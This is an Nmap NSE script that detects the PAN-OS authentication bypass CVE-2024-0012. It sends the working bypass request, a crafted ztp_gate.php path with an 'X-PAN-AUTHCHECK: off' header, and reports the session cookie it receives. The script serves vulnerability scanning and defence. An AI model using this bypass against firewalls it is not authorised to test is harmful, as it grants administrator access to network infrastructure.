local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
Tests for Palo Alto Networks PAN-OS Management Interface Authentication Bypass Vulnerability (CVE-2024-0012).
An authentication bypass enables an unauthenticated attacker with network access to the management web interface 
to gain PAN-OS administrator privileges.

The script attempts to bypass authentication by sending specific HTTP headers and accessing a specially crafted path.
If successful, it indicates the target is vulnerable to authentication bypass.

References:
* https://nvd.nist.gov/vuln/detail/CVE-2024-0012
* https://security.paloaltonetworks.com/CVE-2024-0012
* https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/
]]

-- @usage
-- nmap -p <port> --script panos-cve-2024-0012 <target>
-- nmap -sV --script panos-cve-2024-0012 <target>
--
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | panos-cve-2024-0012:
-- |   VULNERABLE:
-- |   Palo Alto Networks PAN-OS Authentication Bypass
-- |     State: VULNERABLE
-- |     Description:
-- |       An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated 
-- |       attacker with network access to the management web interface to gain PAN-OS administrator privileges.
-- |     Disclosure date: 2024-11-19
-- |     Extra information:
-- |       Target is vulnerable to CVE-2024-0012. Authentication bypass successful.
-- |       Session cookie obtained: PHPSESSID=abc123def456ghi
-- |     References:
-- |       https://security.paloaltonetworks.com/CVE-2024-0012
-- |_      https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/

author = "Dhiraj Mishra (@RandomDhiraj)"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = shortport.http

local function match_response(response)
    if not response or not response.body then return false end
    
    local has_title = response.body:match("<title>Zero Touch Provisioning</title>") or
                     response.body:match("Zero Touch Provisioning %(ZTP%)")
    local has_script = response.body:match("/scripts/cache/mainui.javascript")
    local has_session = response.header["set-cookie"] and 
                       response.header["set-cookie"]:match("PHPSESSID=")
    
    return has_title and has_script and has_session
end

action = function(host, port)
    local vuln_table = {
        title = "Palo Alto Networks PAN-OS Authentication Bypass",
        state = vulns.STATE.NOT_VULN,
        description = [[
An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated 
attacker with network access to the management web interface to gain PAN-OS administrator privileges.
        ]],
        IDS = {CVE = 'CVE-2024-0012'},
        references = {
            'https://security.paloaltonetworks.com/CVE-2024-0012',
            'https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/'
        },
        dates = {
            disclosure = {year = '2024', month = '11', day = '19'},
        }
    }
    local report = vulns.Report:new(SCRIPT_NAME, host, port)
    
    local opts = {
        header = {
            ["X-PAN-AUTHCHECK"] = "off",
            ["Connection"] = "keep-alive"
        },
        redirect_ok = false
    }
    
    local response = http.get(host, port, "/php/ztp_gate.php/.js.map", opts)
    
    if response and response.status == 200 then
        if match_response(response) then
            vuln_table.state = vulns.STATE.VULN
            vuln_table.extra_info = "Target is vulnerable to CVE-2024-0012. Authentication bypass successful."
            
            if response.header["set-cookie"] then
                vuln_table.extra_info = vuln_table.extra_info .. "\nSession cookie obtained: " .. 
                                      response.header["set-cookie"]
            end
        end
    end
    
    return report:make_output(vuln_table)
end

-- Reference from nuclei-templates
